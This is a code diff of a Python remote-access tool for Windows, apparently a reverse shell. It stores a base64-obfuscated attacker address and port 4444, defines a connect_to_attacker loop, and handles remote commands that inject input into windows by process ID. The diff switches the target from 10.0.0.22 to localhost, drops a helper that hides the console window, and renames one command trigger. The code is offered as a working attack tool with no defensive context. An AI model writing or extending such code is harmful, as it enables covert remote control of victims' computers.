@@ -13,8 +13,8 @@ import win32gui
 import requests
 
 # Obfuscated target IP and port
-encoded_target = ""  # Base64 encoded "REDACTED"
-#encoded_target = "bG9jYWxob3N0"  # Base64 encoded "localhost"
+#encoded_target = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
+encoded_target = "bG9jYWxob3N0"  # Base64 encoded "localhost"
 encoded_port = "NDQ0NA=="        # Base64 encoded "4444"
 
 # Decode the target IP and port
@@ -75,14 +75,6 @@ if not ctypes.windll.kernel32.SetConsoleCtrlHandler(handler, True):
 
 #clear console
 subprocess.run("cls", shell=True)
-
-# Hide the command prompt window (Windows only)
-def hide_cmd_window():
-    if os.name == "nt":  # Check if the OS is Windows
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        return startupinfo
-    return None
 
 def connect_to_attacker():
     while True:
@@ -200,14 +192,14 @@ def handle_connection(s):
                         print(f"Error: {e}")
                         output = f"Error: {e}"
 
-                elif command.startswith("minecraft "):
+                elif command.startswith("pidtxt "):
                     output = "Make you set your PID file\n"
                     with open("PID.txt", "r") as file:
                         data = file.read()  # Read entire file
                     # Prompt the user for the PID
                     pid = int(data)
                     # Prompt the user for the command
-                    command = command[10:].strip()
+                    command = command[6:].strip()
                     # Find the window handle by PID
                     hwnd = find_window_by_pid(pid)
                     # Send the command to the window
